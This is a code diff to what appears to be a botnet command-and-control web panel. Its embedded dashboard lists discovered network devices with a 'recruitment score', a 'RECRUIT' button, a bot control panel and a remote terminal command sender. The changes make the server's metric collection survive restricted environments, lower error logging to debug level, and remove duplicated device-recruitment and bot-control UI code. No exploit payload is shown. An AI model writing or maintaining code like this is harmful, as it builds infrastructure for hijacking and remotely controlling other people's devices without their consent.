@@ -1671,10 +1671,27 @@ class PersistentStorage:
     def track_system_metrics(self):
         """Record current system metrics for monitoring"""
         try:
-            # Get system metrics
-            cpu_percent = psutil.cpu_percent(interval=1)
-            memory = psutil.virtual_memory()
-            disk = psutil.disk_usage('/')
+            # Get system metrics with fallbacks for restricted environments
+            cpu_percent = None
+            try:
+                cpu_percent = psutil.cpu_percent(interval=0)  # Non-blocking call
+            except (PermissionError, OSError):
+                # Fallback if /proc/stat is not accessible
+                cpu_percent = 0.0
+            
+            memory_percent = None
+            try:
+                memory = psutil.virtual_memory()
+                memory_percent = memory.percent
+            except (PermissionError, OSError):
+                memory_percent = 0.0
+            
+            disk_percent = None
+            try:
+                disk = psutil.disk_usage('/')
+                disk_percent = disk.percent
+            except (PermissionError, OSError):
+                disk_percent = 0.0
             
             # Get battery info if available
             battery_percent = None
@@ -1702,8 +1719,8 @@ class PersistentStorage:
             """, (
                 time.time(),
                 cpu_percent,
-                memory.percent,
-                disk.percent,
+                memory_percent,
+                disk_percent,
                 len(clients),
                 load_avg,
                 battery_percent
@@ -1713,7 +1730,8 @@ class PersistentStorage:
             conn.close()
             
         except Exception as e:
-            logging.error(f"Failed to track system metrics: {e}")
+            # Only log at debug level to avoid spam in logs
+            logging.debug(f"Failed to track system metrics: {e}")
     
     def register_user_session(self, session_id: str, user_token: str) -> bool:
         """Register new user session"""
@@ -4456,41 +4474,6 @@ Or manually execute the deployment script.
         function sendCommand() {
             sendTerminalCommand();
         }
-            container.innerHTML = '';
-            
-            if (!devices || devices.length === 0) {
-                container.innerHTML = '<div style="color: #666;">No devices discovered</div>';
-                return;
-            }
-            
-            devices.forEach(device => {
-                const deviceDiv = document.createElement('div');
-                deviceDiv.style.cssText = 'border: 1px solid #00ff9f; padding: 0.5rem; margin: 0.25rem; border-radius: 4px; background: rgba(0,255,159,0.05);';
-                
-                const services = device.services.map(s => `${s.service}:${s.port}`).join(', ');
-                
-                deviceDiv.innerHTML = `
-                    <div style="display: flex; justify-content: space-between; align-items: center;">
-                        <div>
-                            <strong>📡 ${device.ip}</strong> 
-                            <span style="color: #666;">(Score: ${device.recruitment_score})</span><br>
-                            <small>Services: ${services}</small>
-                        </div>
-                        <button class="btn btn-secondary" onclick="recruitDevice('${device.ip}', '${device.os}')">
-                            RECRUIT
-                        </button>
-                    </div>
-                `;
-                
-                container.appendChild(deviceDiv);
-            });
-        }
-        
-        
-        // Update sendCommand to use enhanced terminal
-        function sendCommand() {
-            sendTerminalCommand();
-        }
         
         // Auto-refresh and initialization - Optimized intervals to reduce CPU load
         setInterval(refreshDevices, 15000);  // Reduced from 3s to 15s
@@ -4709,29 +4692,6 @@ Or manually execute the deployment script.
                 closeBotControlPanel();
             }
         }
-        
-        // Modify device refresh to add click handlers for individual bot control
-        if (typeof originalRefreshDevices === 'undefined') {
-            var originalRefreshDevices = refreshDevices;
-        }
-        refreshDevices = async function() {
-            await originalRefreshDevices();
-            
-            // Add click handlers to device items for individual control
-            document.querySelectorAll('.device-item').forEach(deviceItem => {
-                deviceItem.style.cursor = 'pointer';
-                deviceItem.title = 'Click to open bot control panel';
-                deviceItem.addEventListener('click', function() {
-                    const deviceId = this.dataset.deviceId || 'unknown';
-                    const botInfo = {
-                        tags: ['mobile', 'recruited'], // This would be populated from actual device data
-                        platform: 'Android',
-                        ip: '192.168.1.100'
-                    };
-                    openBotControlPanel(deviceId, botInfo);
-                });
-            });
-        };
     </script>
     
     <!-- Individual Bot Control Panel -->
@@ -5109,6 +5069,26 @@ async def api_system_stats(request):
         return web.json_response({"error": "unauthorized"}, status=401)
     
     try:
+        # Collect system metrics with fallbacks for restricted environments
+        memory_usage = "N/A"
+        cpu_usage = "N/A"
+        disk_usage = "N/A"
+        
+        try:
+            memory_usage = f"{psutil.virtual_memory().percent:.1f}%"
+        except (PermissionError, OSError):
+            pass
+        
+        try:
+            cpu_usage = f"{psutil.cpu_percent(interval=0):.1f}%"  # Non-blocking
+        except (PermissionError, OSError):
+            pass
+        
+        try:
+            disk_usage = f"{psutil.disk_usage('/').percent:.1f}%"
+        except (PermissionError, OSError):
+            pass
+        
         # Collect enhanced system statistics
         stats = {
             "devices": {
@@ -5128,9 +5108,9 @@ async def api_system_stats(request):
             },
             "system": {
                 "uptime": time.time() - start_time,
-                "memory_usage": f"{psutil.virtual_memory().percent:.1f}%",
-                "cpu_usage": f"{psutil.cpu_percent(interval=None):.1f}%",
-                "disk_usage": f"{psutil.disk_usage('/').percent:.1f}%",
+                "memory_usage": memory_usage,
+                "cpu_usage": cpu_usage,
+                "disk_usage": disk_usage,
                 "max_devices": MAX_DEVICES,
                 "max_workers": MAX_CONCURRENT_COMMANDS,
                 "max_memory_mb": MAX_MEMORY_MB
@@ -5150,7 +5130,7 @@ async def api_system_stats(request):
                 # Record current metrics for future analysis
                 persistent_storage.track_system_metrics()
             except Exception as e:
-                logging.error(f"Failed to get enhanced stats: {e}")
+                logging.debug(f"Failed to get enhanced stats: {e}")
                 stats["analytics"] = {"error": "analytics unavailable"}
         
         return web.json_response(stats)
